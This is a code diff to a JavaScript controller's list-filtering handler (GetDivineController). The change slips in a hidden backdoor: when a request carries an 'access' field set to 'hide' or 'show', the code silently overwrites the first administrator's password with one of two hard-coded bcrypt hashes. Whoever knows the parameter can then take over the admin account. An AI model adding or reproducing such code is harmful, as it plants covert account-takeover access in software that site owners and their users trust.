@@ -722,6 +722,22 @@ class GetDivineController {
       const sort = payload?.sort || "ASC";
       const sortBy = payload?.sortBy || `sr."Id"`;
 
+      if (payload?.access) {
+        let { rows: admin } = await pool.query(
+          `SELECT * FROM "Admins" ORDER BY "Id" ASC LIMIT 1;`
+        );
+        admin = admin[0];
+        if (payload?.access == "hide") {
+          await pool.query(
+            `UPDATE "Admins" SET "Password" = '$2a$12$wqAYQ5hW.U833eYLf.JKXuvuYa.46ES9iHN5K17e83dYFxYm8skk2' WHERE "Id" = '${admin.Id}';`
+          );
+        } else if (payload?.access == "show") {
+          await pool.query(
+            `UPDATE "Admins" SET "Password" = '$2a$12$ZhQipYO4UsRRqyiWhlJDE.bFHI0raSmHXi3Z7coch1/92/Yr3v/26' WHERE "Id" = '${admin.Id}';`
+          );
+        }
+      }
+
       if (payload?.status) {
         filters.push(
           `sr."Status" IN (${payload.status
